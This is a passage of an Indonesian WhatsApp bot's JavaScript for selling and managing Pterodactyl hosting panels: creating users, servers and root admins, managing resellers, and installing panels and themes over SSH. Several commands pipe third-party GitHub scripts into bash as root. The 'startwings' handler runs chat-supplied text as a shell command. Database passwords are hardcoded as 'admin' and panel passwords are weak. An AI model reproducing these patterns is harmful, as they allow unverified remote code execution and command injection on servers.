⏰ ${new Date().toLocaleString('id-ID')}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
    await client.sendMessage(m.chat, {
      text: teks, mentions: [m.sender], contextInfo: {
        externalAdReply: {
          title: `Transaksi Done ✅`,
          body: `© Powered By ${namaOwner}`,
          thumbnailUrl: global.image.reply,
          sourceUrl: `${global.source}`,
        }
      }
    }, { quoted: null })
  }
  break

  /// ───────────── [ 𝖬𝖾𝗇𝗎 𝖯𝖺𝗇𝖾𝗅 𝖱𝖺𝗆 ] ──────────── ///
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
  try {
    if (!isOwner && !isPremium) return xreply(mess.reseller)
    if (!text) return xreply(example("nama / nama,628xxx"))

    let input = text.split(",")
    let nama = input[0].trim()
    let nomor = null

    if (input[1]) {
      nomor = input[1].replace(/[^0-9]/g, "")
      if (nomor.startsWith("0")) nomor = "62" + nomor.slice(1)
      if (!nomor.startsWith("62")) nomor = "62" + nomor
    }

    global.panel = nama

    var ram, disknya, cpu
    if (command == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (command == "2gb") { ram="2000"; disknya="1000"; cpu="60" }
    else if (command == "3gb") { ram="3000"; disknya="2000"; cpu="80" }
    else if (command == "4gb") { ram="4000"; disknya="2000"; cpu="100" }
    else if (command == "5gb") { ram="5000"; disknya="3000"; cpu="120" }
    else if (command == "6gb") { ram="6000"; disknya="3000"; cpu="140" }
    else if (command == "7gb") { ram="7000"; disknya="4000"; cpu="160" }
    else if (command == "8gb") { ram="8000"; disknya="4000"; cpu="180" }
    else if (command == "9gb") { ram="9000"; disknya="5000"; cpu="200" }
    else if (command == "10gb") { ram="10000"; disknya="5000"; cpu="220" }
    else { ram="0"; disknya="0"; cpu="0" }

    let username = nama.toLowerCase().replace(/[^a-z0-9]/g, "") + crypto.randomBytes(2).toString('hex')
    let email = username+"@gmail.com"
    let name = capital(nama) + " Server"
    let password = username+crypto.randomBytes(2).toString('hex')

    let f = await fetch(domain + "/api/application/users", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "email": email,
        "username": username,
        "first_name": name,
        "last_name": nomor ? nomor : "default",
        "language": "en",
        "password": password
      })
    })
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))

    let user = data.attributes
    let desc = tanggal(Date.now())
    let usr_id = user.id

    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
      "method": "GET",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey}
    })
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup

    let f2 = await fetch(domain + "/api/application/servers", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "name": name,
        "description": desc,
        "user": usr_id,
        "egg": parseInt(egg),
        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
        "startup": startup_cmd,
        "environment": {"INST":"npm","USER_UPLOAD":"0","AUTO_UPDATE":"0","CMD_RUN":"npm start"},
        "limits": {"memory": ram,"swap": 0,"disk": disknya,"io": 500,"cpu": cpu},
        "feature_limits": {"databases": 5,"backups": 5,"allocations": 5},
        deploy: {locations: [parseInt(loc)],dedicated_ip: false,port_range: []}
      })
    })
    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    let orang = nomor ? nomor + "@s.whatsapp.net" : (m.isGroup ? m.sender : m.chat)
    let isPrivateChat = !orang.endsWith("@g.us")

    var teks = `‼️ *𝖲𝖴𝖢𝖢𝖤𝖤𝖣 𝖢𝖱𝖤𝖠𝖳𝖤 𝖠𝖣𝖬𝖨𝖭*`
    var xdata = `𓈃 *𝖣𝖠𝖳𝖠 𝖯𝖠𝖭𝖤𝖫 𝖠𝖭𝖣𝖠*
└╼ *Username:* ${user.username}
└╼ *Password:* ${password}
└╼ *𝖨𝖣:* ${server.id}

─▢ *Login:* \`${global.domain}\`

*📡 𝖲𝖤𝖱𝖳𝖨𝖥𝖨𝖪𝖠𝖳*
- 𝖱𝖺𝗆: ${ram=="0"?"Unlimited":ram/1000+"GB"}
- 𝖣𝗂𝗌𝗄: ${disknya=="0"?"Unlimited":disknya/1000+"GB"}
- 𝖢𝗉𝗎: ${cpu=="0"?"Unlimited":cpu+"%"}

*‼️ 𝖭𝖮𝖳𝖤:*
Masa aktif 30 hari
Data bersifat pribadi
Garansi 15 hari (1x replace)
Klaim wajib menyertakan bukti chat pembelian

📮 *𝖢𝗌 𝖯𝖺𝗇𝖾𝗅:* wa.me/6281313532320`

    const panelUrl = String(global.domain).startsWith("http") ? global.domain : `https://${global.domain}`

    const interactive = {
      body: { text: teks },
      footer: { text: xdata },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "Copy Username",
              copy_code: String(user.username)
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "Copy Password",
              copy_code: String(password.toString())
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Buka Panel",
              url: panelUrl,
              merchant_url: panelUrl
            })
          }
        ]
      }
    }

    const buttonMsg = generateWAMessageFromContent(orang, {
      viewOnceMessageV2Extension: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
        }
      }
    }, {
      userJid: client.user.id,
      quoted: m,
      messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
    })

    let additionalNodes = [
      {
        tag: "biz",
        attrs: {},
        content: [
          {
            tag: "interactive",
            attrs: { type: "native_flow", v: "1" },
            content: [
              { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
            ]
          }
        ]
      }
    ]

    if (isPrivateChat) {
      additionalNodes.push({
        tag: "bot",
        attrs: { biz_bot: "1" },
        content: []
      })
    }

    await client.relayMessage(orang, buttonMsg.message, {
      messageId: buttonMsg.key.id,
      additionalNodes: additionalNodes
    })

    let tujuan = nomor ? nomor : "PM"
    await client.sendMessage(m.chat, {
      text: `✅ Done, terkirim ke ${tujuan}`
    }, { quoted: m })

    delete global.panel

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

case "cadmin": {
  if (!isOwner) return reply(mess.owner)
  if (!text) return xreply(example("username"))

  let username = text.toLowerCase()
  let email = username + "@gmail.com"
  let name = capital(args[0])
  let password = username + crypto.randomBytes(2).toString('hex')

  let f = await fetch(domain + "/api/application/users", {
    "method": "POST",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    },
    "body": JSON.stringify({
      "email": email,
      "username": username.toLowerCase(),
      "first_name": name,
      "last_name": "Admin",
      "root_admin": true,
      "language": "en",
      "password": password.toString()
    })
  })
  let data = await f.json()
  if (data.errors) return xreply(JSON.stringify(data.errors[0], null, 2))

  let user = data.attributes
  let orang
  let isPrivateChat = false

  if (m.isGroup) {
    orang = m.sender
    await xreply(`*Berhasil membuat admin panel ✅*\n\`Data akun sudah di kirim ke private chat\``)
    isPrivateChat = true
  } else {
    orang = m.chat
  }

  const teks = `‼️ *𝖲𝖴𝖢𝖢𝖤𝖤𝖣 𝖢𝖱𝖤𝖠𝖳𝖤 𝖠𝖣𝖬𝖨𝖭*`
  const xdata = `𓈃 *𝖣𝖠𝖳𝖠 𝖯𝖠𝖭𝖤𝖫 𝖠𝖭𝖣𝖠*
└╼ *Username:* ${user.username}
└╼ *Password:* ${password.toString()}
└╼ *𝖨𝖣:* ${user.id}

─▢ *Login:* \`${global.domain}\`

*‼️ 𝖭𝖮𝖳𝖤:*
Masa aktif 30 hari
Data bersifat pribadi
Garansi 15 hari (1x replace)
Klaim wajib menyertakan bukti chat pembelian

📮 *𝖢𝗌 𝖯𝖺𝗇𝖾𝗅:* wa.me/6281313532320`

  const panelUrl = String(global.domain).startsWith("http") ? global.domain : `https://${global.domain}`

  const interactive = {
    body: { text: teks },
    footer: { text: xdata },
    nativeFlowMessage: {
      buttons: [
        {
          name: "cta_copy",
          buttonParamsJson: JSON.stringify({
            display_text: "Copy Username",
            copy_code: String(user.username)
          })
        },
        {
          name: "cta_copy",
          buttonParamsJson: JSON.stringify({
            display_text: "Copy Password",
            copy_code: String(password.toString())
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Buka Panel",
            url: panelUrl,
            merchant_url: panelUrl
          })
        }
      ]
    }
  }

  const buttonMsg = generateWAMessageFromContent(orang, {
    viewOnceMessageV2Extension: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
      }
    }
  }, {
    userJid: client.user.id,
    quoted: m,
    messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
  })

  let additionalNodes = [
    {
      tag: "biz",
      attrs: {},
      content: [
        {
          tag: "interactive",
          attrs: { type: "native_flow", v: "1" },
          content: [
            { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
          ]
        }
      ]
    }
  ]

  if (isPrivateChat) {
    additionalNodes.push({
      tag: "bot",
      attrs: { biz_bot: "1" },
      content: []
    })
  }

  await client.relayMessage(orang, buttonMsg.message, {
    messageId: buttonMsg.key.id,
    additionalNodes: additionalNodes
  })
}
break

  case "addseller": {
    if (!isOwner) return xreply(mess.owner)
    if (!text && !m.quoted) return xreply(example("6285###"))
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    const input2 = input.split("@")[0]
    if (input2 === global.owner || premium.includes(input) || input === botNumber) return xreply(`Nomor ${input2} sudah menjadi reseller!`)
    premium.push(input)
    await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
    xreply(`Berhasil menambah reseller ✅`)
  }
  break

  case "listseller": {
    if (premium.length < 1) return xreply("Tidak ada user reseller")
    let teks = `\n *乂 List all reseller panel*\n`
    for (let i of premium) {
      teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
    }
    client.sendMessage(m.chat, { text: teks, mentions: premium }, { quoted: m })
  }
  break

  case "delseller": {
    if (!isOwner) return xreply(mess.owner)
    if (!m.quoted && !text) return xreply(example("6285###"))
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    const input2 = input.split("@")[0]
    if (input2 == global.owner || input == botNumber) return xreply(`Tidak bisa menghapus owner!`)
    if (!premium.includes(input)) return xreply(`Nomor ${input2} bukan reseller!`)
    let posi = premium.indexOf(input)
    await premium.splice(posi, 1)
    await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
    xreply(`Berhasil menghapus reseller ✅`)
  }
  break

  case "babu": {
    if (!isOwner) return xreply(mess.owner)
    if (!text && !m.quoted) return xreply(example("6285###"))
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    const input2 = input.split("@")[0]
    if (input2 === global.owner || premium.includes(input) || input === botNumber) return xreply(`Nomor ${input2} sudah menjadi reseller!`)
    premium.push(input)
    await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
    xreply(`Berhasil menambah User kacung jadi Prem  ✅`)
  }
  break

  /// ───────────── [ 𝖫𝗂𝗌𝗍 𝖠𝖽𝗆𝗂𝗇 & 𝖯𝖺𝗇𝖾𝗅 ] ──────────── ///
  case "listadmin": {
    if (!isOwner && !isPremium) return xreply(mess.owner)
    let cek = await fetch(domain + "/api/application/users?page=1", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikey
      }
    })
    let res2 = await cek.json();
    let users = res2.data;
    if (users.length < 1) return xreply("Tidak ada admin panel")
    var teks = " *乂 List admin panel pterodactyl*\n"
    await users.forEach((i) => {
      if (i.attributes.root_admin !== true) return
      teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
    })
    await client.sendMessage(m.chat, {
      buttons: [
        { buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
      ],
      footer: `© 2026 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: teks,
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      },
    }, { quoted: m })
  }
  break

  case "listpanel":
  case "listp":
  case "listserver": {
    if (!isOwner && !isPremium) return xreply(mess.owner)
    let f = await fetch(domain + "/api/application/servers?page=1", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikey
      }
    })
    let res = await f.json();
    let servers = res.data;
    if (servers.length < 1) return xreply("Tidak Ada Server Bot")
    let messageText = "\n  *乂 List server panel pterodactyl*\n"
    for (let server of servers) {
      let s = server.attributes
      let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
        "method": "GET",
        "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": "Bearer " + capikey
        }
      })
      let data = await f3.json();
      let status = data.attributes ? data.attributes.current_state : s.status;
      messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
    }

    await client.sendMessage(m.chat, {
      buttons: [
        { buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
      ],
      footer: `© 2026 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: messageText,
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      },
    }, { quoted: m })
  }
  break

case "deladmin": {
  if (!isOwner) return xreply(mess.owner)

  const headers = {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Authorization": "Bearer " + apikey
  }

  if (!text) {
    let cek = await fetch(domain + "/api/application/users?page=1&per_page=100", { method: "GET", headers })
    let res2 = await cek.json()
    let users = res2.data || []

    let list = []
    for (let i of users) {
      if (i.attributes.root_admin !== true) continue
      list.push({
        title: `${i.attributes.first_name} (ID ${i.attributes.id})`,
        description: i.attributes.username,
        id: `.deladmin ${i.attributes.id}`
      })
    }
    if (list.length < 1) return xreply("Tidak ada admin panel")

    const interactive = {
      body: { text: "Pilih Salah Satu Admin Panel" },
      footer: { text: `© 2026 ${botname}` },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "Pilih Admin Panel",
              sections: [
                {
                  title: "List Admin Panel",
                  rows: list
                }
              ]
            })
          }
        ]
      }
    }

    const buttonMsg = generateWAMessageFromContent(m.chat, {
      viewOnceMessageV2Extension: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
        }
      }
    }, {
      userJid: client.user.id,
      quoted: m,
      messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
    })

    let additionalNodes = [
      {
        tag: "biz",
        attrs: {},
        content: [
          {
            tag: "interactive",
            attrs: { type: "native_flow", v: "1" },
            content: [
              { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
            ]
          }
        ]
      }
    ]

    return await client.relayMessage(m.chat, buttonMsg.message, {
      messageId: buttonMsg.key.id,
      additionalNodes: additionalNodes
    })
  }

  let targetId = text.trim().split(" ")[0]

  let cek = await fetch(domain + "/api/application/users?page=1&per_page=100", { method: "GET", headers })
  let res2 = await cek.json()
  let users = res2.data || []

  let target = users.find(e => e.attributes.id == targetId && e.attributes.root_admin == true)
  if (!target) return xreply("Akun admin panel tidak ditemukan!")

  let delusr = await fetch(domain + `/api/application/users/${target.attributes.id}`, {
    method: "DELETE",
    headers
  })
  
  if (!delusr.ok) {
    let err = await delusr.json().catch(() => ({}))
    return xreply("❌ Gagal menghapus admin:\n" + JSON.stringify(err.errors ? err.errors[0] : err, null, 2))
  }

  await xreply(`Berhasil menghapus akun admin panel *${capital(target.attributes.username)}*`)
}
break

case "delpanel": {
  if (!isOwner && !isPremium) return xreply(mess.owner)

  const headers = {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Authorization": "Bearer " + apikey
  }

  const toGB = (mb) => Number(mb) === 0 ? "Unlimited" : (Number(mb) / 1000) + "GB"

  if (!text) {
    let f = await fetch(domain + "/api/application/servers?page=1&per_page=100", { method: "GET", headers })
    let res = await f.json()
    let servers = res.data || []
    if (servers.length < 1) return xreply("Tidak Ada Server Bot")

    let list = []
    for (let server of servers) {
      let s = server.attributes
      list.push({
        title: `${s.name} (ID ${s.id})`,
        description: `Ram ${toGB(s.limits.memory)} || Disk ${toGB(s.limits.disk)} || CPU ${Number(s.limits.cpu) === 0 ? "Unlimited" : s.limits.cpu + "%"}`,
        id: `.delpanel ${s.id}`
      })
    }

    const interactive = {
      body: { text: "Pilih Salah Satu Server Panel" },
      footer: { text: `© 2026 ${botname}` },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "Pilih Server Panel",
              sections: [
                {
                  title: "List Server Panel",
                  rows: list
                }
              ]
            })
          }
        ]
      }
    }

    const buttonMsg = generateWAMessageFromContent(m.chat, {
      viewOnceMessageV2Extension: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
        }
      }
    }, {
      userJid: client.user.id,
      quoted: m,
      messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
    })

    let additionalNodes = [
      {
        tag: "biz",
        attrs: {},
        content: [
          {
            tag: "interactive",
            attrs: { type: "native_flow", v: "1" },
            content: [
              { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
            ]
          }
        ]
      }
    ]

    return await client.relayMessage(m.chat, buttonMsg.message, {
      messageId: buttonMsg.key.id,
      additionalNodes: additionalNodes
    })
  }

  let targetId = text.trim().split(" ")[0]

  let f = await fetch(domain + "/api/application/servers?page=1&per_page=100", { method: "GET", headers })
  let result = await f.json()
  let servers = result.data || []

  let target = servers.find(sv => sv.attributes.id == Number(targetId))
  if (!target) return xreply("Server panel tidak ditemukan!")

  let s = target.attributes
  let nameSrv = s.name
  let sections = s.name.toLowerCase()

  let delSrv = await fetch(domain + `/api/application/servers/${s.id}`, { method: "DELETE", headers })
  if (!delSrv.ok) {
    let err = await delSrv.json().catch(() => ({}))
    return xreply("❌ Gagal menghapus server:\n" + JSON.stringify(err.errors ? err.errors[0] : err, null, 2))
  }

  let cek = await fetch(domain + "/api/application/users?page=1&per_page=100", { method: "GET", headers })
  let res2 = await cek.json()
  let users = res2.data || []
  for (let user of users) {
    let u = user.attributes
    if (u.root_admin) continue
    if (u.first_name.toLowerCase() == sections) {
      await fetch(domain + `/api/application/users/${u.id}`, { method: "DELETE", headers })
    }
  }

  xreply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

  /// ───────────── [ 𝖯𝗍𝖾𝗋𝗈𝖽𝖺𝖼𝗍𝗒𝗅 𝖨𝗇𝗌𝗍𝖺𝗅𝗅𝖾𝗋 ] ──────────── ///
  case "installpanel": {
    if (!isOwner) return xreply(mess.owner)
    if (!text) return xreply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
    let vii = text.split("|")
    if (vii.length < 5) return xreply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
    let sukses = false

    const ress = new Client();
    const connSettings = {
      host: vii[0],
      port: '22',
      username: 'root',
      password: vii[1]
    }

    const pass = "admin" + getRandom("")
    let passwordPanel = pass
    const domainpanel = vii[2]
    const domainnode = vii[3]
    const ramserver = vii[4]
    const deletemysql = `\n`
    const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

    async function instalWings() {
      ress.exec(commandPanel, (err, stream) => {
        if (err) throw err;
        stream.on('close', async (code, signal) => {
          ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
              let teks = `
*🌐 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
              await client.sendMessage(m.chat, { text: teks }, { quoted: m })
            }).on('data', async (data) => {
              await console.log(data.toString())
              if (data.toString().includes("Masukkan nama lokasi: ")) {
                stream.write('Singapore\n');
              }
              if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                stream.write('Node By Skyzo\n');
              }
              if (data.toString().includes("Masukkan domain: ")) {
                stream.write(`${domainnode}\n`);
              }
              if (data.toString().includes("Masukkan nama node: ")) {
                stream.write('Node By Skyzo\n');
              }
              if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                stream.write(`${ramserver}\n`);
              }
              if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                stream.write(`${ramserver}\n`);
              }
              if (data.toString().includes("Masukkan Locid: ")) {
                stream.write('1\n');
              }
            }).stderr.on('data', async (data) => {
              console.log('Stderr : ' + data);
            });
          });
        }).on('data', async (data) => {
          if (data.toString().includes('Input 0-6')) {
            stream.write('1\n');
          }
          if (data.toString().includes('(y/N)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Enter the panel address (blank for any address)')) {
            stream.write(`${domainpanel}\n`);
          }
          if (data.toString().includes('Database host username (pterodactyluser)')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Database host password')) {
            stream.write(`admin\n`);
          }
          if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
            stream.write(`${domainnode}\n`);
          }
          if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
            stream.write('admin@gmail.com\n');
          }
          console.log('Logger: ' + data.toString())
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
      })
    }

    async function instalPanel() {
      ress.exec(commandPanel, (err, stream) => {
        if (err) throw err;
        stream.on('close', async (code, signal) => {
          await instalWings()
        }).on('data', async (data) => {
          if (data.toString().includes('Input 0-6')) {
            stream.write('0\n');
          }
          if (data.toString().includes('(y/N)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Database name (panel)')) {
            stream.write('\n');
          }
          if (data.toString().includes('Database username (pterodactyl)')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Password (press enter to use randomly generated password)')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
            stream.write('Asia/Jakarta\n');
          }
          if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
            stream.write('admin@gmail.com\n');
          }
          if (data.toString().includes('Email address for the initial admin account')) {
            stream.write('admin@gmail.com\n');
          }
          if (data.toString().includes('Username for the initial admin account')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('First name for the initial admin account')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Last name for the initial admin account')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Password for the initial admin account')) {
            stream.write(`${passwordPanel}\n`);
          }
          if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
            stream.write(`${domainpanel}\n`);
          }
          if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
            stream.write('y\n')
          }
          if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
            stream.write('1\n');
          }
          if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('(yes/no)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Still assume SSL? (y/N)')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('y\n');
          }
          if (data.toString().includes('(A)gree/(C)ancel:')) {
            stream.write('A\n');
          }
          console.log('Logger: ' + data.toString())
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
      });
    }

    ress.on('ready', async () => {
      await xreply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
      ress.exec(deletemysql, async (err, stream) => {
        if (err) throw err;
        stream.on('close', async (code, signal) => {
          await instalPanel();
        }).on('data', async (data) => {
          await stream.write('\t')
          await stream.write('\n')
          await console.log(data.toString())
        }).stderr.on('data', async (data) => {
          console.log('Stderr : ' + data);
        });
      });
    }).connect(connSettings);
  }
  break

  case "startwings":
  case "swings": {
    if (!isOwner) return;

    let t = text.split('|');
    if (t.length < 3) return xreply(example("ipvps|pwvps|token_node"));

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    };

    const command = `${token} && systemctl start wings`;
    const ress = new Client();

    ress.on('ready', () => {
      ress.exec(command, (err, stream) => {
        if (err) throw err;

        stream.on('close', async (code, signal) => {
          await xreply("*Berhasil menjalankan wings ✅*\nSilahkan cek panel anda 😋");
          ress.end();
        }).on('data', async (data) => {
          await console.log(data.toString());
        }).stderr.on('data', (data) => {
          stream.write("y\n");
          stream.write("systemctl start wings\n");
          xreply('STDERR: ' + data);
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Kata sandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break;

  /// ───────────── [ 𝖯𝖺𝗇𝖾𝗅 𝖳𝗁𝖾𝗆𝖺 ] ──────────── ///
case 'installtema': {
  if (!isOwner) return xreply(mess.owner)
  if (!text || !text.includes("|")) return xreply("Contoh: .installtema ipvps|pwvps")

  let vii = text.split("|").map(a => a.trim())
  if (!vii[0] || !vii[1]) return xreply("Contoh: .installtema ipvps|pwvps")

  global.installtema = {
    vps: vii[0],
    pwvps: vii[1]
  }

  const thum = await getBuffer("https://files.catbox.moe/x8nxvv.jpg")
  const thums = await prepareWAMessageMedia(
    { image: thum },
    { upload: client.waUploadToServer }
  )

  const rowsTema = [
    { title: "Enigma",    description: "Install tema Enigma",    id: `${prefix}installtemaenigma` },
    { title: "Nightcore", description: "Install tema Nightcore", id: `${prefix}installtemanightcore` },
    { title: "Stellar",   description: "Install tema Stellar",   id: `${prefix}installtemastellar` },
    { title: "Billing",   description: "Install tema Billing",   id: `${prefix}installtemabilling` },
    { title: "Nebula",    description: "Install tema Nebula",    id: `${prefix}installtemanebula` }
  ]
  const rowsLain = [
    { title: "Install Depend", description: "Install dependensi",  id: `${prefix}installdepend` },
    { title: "Uninstall Tema", description: "Hapus tema terpasang", id: `${prefix}uninstallthema` }
  ]

  const interactive = {
    header: {
      title: "",
      hasMediaAttachment: true,
      imageMessage: thums.imageMessage
    },
    body: { text: "\nSilahkan pilih tema\n" },
    footer: { text: "MISTER-MD" },
    nativeFlowMessage: {
      messageParamsJson: "",
      buttons: [
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "𝙋𝙄𝙇𝙄𝙃 𝙏𝙃𝙀𝙈𝘼",
            sections: [
              { title: "Daftar Tema", rows: rowsTema },
              { title: "Lainnya", rows: rowsLain }
            ]
          })
        }
      ]
    }
  }

  await client.sendMessage(
    m.chat,
    {
      viewOnceMessageV2Extension: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage:
            proto.Message.InteractiveMessage.fromObject(interactive)
        }
      }
    },
    { quoted: m }
  )
}
break


  case "uninstallthema": {
    if (!isOwner) return xreply(mess.owner)
    if (global.installtema == undefined) return xreply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    }

    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client();

    await xreply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

    ress.on('ready', () => {
      ress.exec(command, (err, stream) => {
        if (err) throw err
        stream.on('close', async (code, signal) => {
          await xreply("Berhasil *uninstall* tema pterodactyl ✅")
          ress.end()
        }).on('data', async (data) => {
          console.log(data.toString())
          stream.write(`skyzodev\n`)
          stream.write(`2\n`)
          stream.write(`y\n`)
          stream.write(`x\n`)
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data)
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break

  case "installtemaenigma":
  case "instaltemaenigma": {
    if (!isOwner) return xreply(mess.owner)
